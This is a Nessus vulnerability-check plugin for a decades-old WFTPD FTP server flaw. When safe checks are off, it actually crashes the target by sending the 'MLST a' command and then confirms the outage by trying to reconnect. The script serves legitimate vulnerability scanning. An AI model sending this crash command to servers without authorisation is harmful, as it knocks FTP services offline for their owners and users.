#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10487);
 script_bugtraq_id(1506);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2000-0647");
 script_xref(name:"OSVDB", value:"386");
 
 script_name(english:"WFTPD 2.41 rc11 Unauthenticated MLST Command Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"The remote FTP server crashes when the command 'MLST a' is issued right
after connecting to it.

An attacker may use this flaw to prevent you from publishing anything 
using FTP." );
 script_set_attribute(attribute:"solution", value:
"If you are using wftp, then upgrade to version 2.41 RC12, if you are 
not, then contact your vendor for a fix." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
 
script_end_attributes();

 script_summary(english: "Crashes the remote FTP server");
 script_category(ACT_MIXED_ATTACK); # mixed

 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencie("find_service1.nasl", "ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 script_exclude_keys("ftp/false_ftp");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if (! get_port_state(port)) exit(0);

if (get_kb_item('ftp/'+port+'/broken') ||
    get_kb_item('ftp/'+port+'/backdoor')) exit(0);

if(safe_checks())
{
 banner = get_ftp_banner(port: port);
 if("WFTP" >< banner)
 {
txt = 
"Nessus reports this vulnerability using only information that was 
gathered. Use caution when testing without safe checks enabled.";
 security_warning(port:port, extra: txt);
 }
 exit(0);
}

if (report_paranoia < 2) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  r = ftp_recv_line(socket:soc);
  if(!r || "WFTPD" >< r )exit(0);
 
  req = string("MLST a\r\n");
  send(socket:soc, data:req);
  r = ftp_recv_line(socket:soc);
  close(soc);
  
  for (i = 0; i < 3 && ! soc2; i ++)
  {
   sleep(i);
   soc2 = open_sock_tcp(port);
  }
  if(!soc2)security_warning(port);
  else {
    r = ftp_recv_line(socket:soc2, retry: 3);
    if(!r)security_warning(port);
    }
   close(soc2);
 }
}
